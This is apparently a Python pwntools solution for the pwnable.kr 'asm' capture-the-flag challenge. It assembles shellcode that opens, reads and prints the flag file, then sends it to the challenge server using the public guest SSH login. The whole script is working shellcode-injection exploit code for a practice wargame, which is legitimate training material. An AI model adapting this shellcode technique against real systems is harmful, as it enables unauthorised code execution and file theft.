from pwn import *

context(arch='amd64', os='linux')

file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
length = 50

shellcode = asm(
	shellcraft.open(file_name) +
	shellcraft.read('rax', 'rsp', length) +
	shellcraft.write(1, 'rsp', length) +
	shellcraft.exit(0))

sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)
p = sh.remote('0', 9026)

print(p.recv())
p.sendline(shellcode)
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
